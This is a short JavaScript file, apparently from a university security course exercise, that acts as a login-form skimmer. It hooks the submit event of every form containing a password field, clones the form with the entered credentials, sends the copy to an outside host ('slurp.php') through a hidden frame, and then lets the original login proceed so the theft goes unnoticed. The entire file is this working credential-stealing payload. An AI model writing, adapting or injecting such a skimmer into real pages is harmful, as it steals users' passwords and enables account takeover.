const forms = document.querySelectorAll("form:has(input[type='password'])");

for (const form of forms) {
  // On submit of form, create a copy of the form with data with a new action
  // and submit it
  form.onsubmit = function (event) {
    event.preventDefault();
    const newForm = form.cloneNode(true);
    newForm.action = "http://treeforty.csse.rose-hulman.edu/f/slurp.php";
    newForm.target = "frame";
    const input = document.createElement("input");
    input.type = "hidden";
    input.name = "340team";
    input.value = "CapComm";
    newForm.appendChild(input);
    document.querySelector("body").appendChild(newForm);
    newForm.submit();
    setTimeout(() => form.submit(), 500);
  };
}
